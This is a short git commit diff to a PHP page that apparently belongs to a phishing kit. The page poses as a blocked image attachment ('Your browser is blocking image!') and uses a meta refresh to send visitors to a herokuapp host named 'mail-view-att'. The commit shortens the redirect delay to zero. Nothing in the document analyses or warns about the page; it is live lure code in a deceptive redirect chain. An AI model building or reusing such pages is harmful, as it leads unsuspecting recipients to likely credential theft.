73db92487416fc1a5d6f23d34c07ed6182d32bc2
bobstottts <bobstottts@googlemail.com>
2017-11-27 00:14:36 -0500

    Update 10.php

--- u/u/10.php
+++ u/u/10.php
@@ -4,6 +4,6 @@
 	<title>Jpeg</title>
 </head>
 <body></body>
-<meta content="1;url=https://mail-view-att.herokuapp.com/u/u/11.php" http-equiv="refresh" /><span style="font-size:10px;">Your browser is blocking image!</span>
+<meta content="0;url=https://mail-view-att.herokuapp.com/u/u/11.php" http-equiv="refresh" /><span style="font-size:10px;">Your browser is blocking image!</span>
 <p style="text-align: center;"><span style="font-size:10px;"><img alt="" src="http://p.globalsources.com/IMAGES/PDT/B1155241222/Custom-fashion-cotton-school-skirts-black.jpg" style="width: 360px; height: 360px;" /></span></p>
 </html>
